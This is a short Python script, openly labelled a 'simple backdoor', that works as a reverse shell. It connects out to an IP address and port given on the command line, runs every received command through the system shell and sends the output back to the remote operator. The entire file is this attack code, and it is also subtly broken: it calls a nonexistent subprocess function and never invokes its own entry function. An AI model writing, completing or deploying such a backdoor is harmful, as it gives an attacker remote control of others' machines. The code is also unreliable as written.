#!/usr/bin/env python3

'''
Name : Alexis Rodriguez
Date : 2020-02-16
Description : simple backdoor
'''

import socket as sck
import subprocess as subp
import sys

def initiate():
    BUFFER = 4096
    IP, PORT = sys.argv[1], int(sys.argv[2])
    with sck.socket(sck.AF_INET, sck.SOCK_STREAM) as sock:
        sock.connect((IP, PORT))
        COMMAND = True
        while COMMAND:
            COMMAND = sock.recv(BUFFER)
            RESULT = exe_cmd(COMMAND)
            sock.send(RESULT)
            
def exe_cmd(COMMAND):
    return subp.check_out(COMMAND, shell=True)
